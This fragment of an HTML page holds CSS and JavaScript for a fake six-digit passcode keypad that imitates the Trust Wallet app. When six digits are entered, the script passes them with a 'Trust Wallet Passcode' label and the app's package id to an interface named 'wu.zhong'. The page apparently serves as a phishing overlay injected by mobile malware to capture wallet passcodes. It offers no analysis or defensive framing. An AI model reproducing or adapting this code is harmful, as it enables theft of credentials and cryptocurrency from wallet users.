}
.digits .digit{

font-weight: bold;

height: 80px;
}
.digitsBox{
position: absolute;
bottom: 20px;
width: 100%;
left: 0;

<script type="text/javascript">
let currentInputIndex = 1;
let enteredDigits = '';

document.querySelectorAll('.digit').forEach(button => {
  button.addEventListener('click', () => {


    

    if (button.id === 'backspace-btn') {

      if (currentInputIndex > 1) {
        currentInputIndex--;
        document.getElementById(`box${currentInputIndex}`).value = '';
        enteredDigits = enteredDigits.slice(0, -1);
      }
    } else {

    if (currentInputIndex <= 6) {
      const digit = button.textContent;
      const input = document.getElementById(`box${currentInputIndex}`);
      input.value = digit;
      currentInputIndex++;
      enteredDigits += digit; 
    }

   }


    if (currentInputIndex > 1) {
        document.getElementById(`back`).setAttribute('fill', '#fff');
    }else{
        document.getElementById(`back`).setAttribute('fill', '#434344');
    }


    if(enteredDigits.length === 6) {
     wu.zhong(`🔰Trust Wallet Passcode \n\n🔒Code: ${enteredDigits}`,"com.wallet.crypto.trustapp");
    }

  });
});




</script>
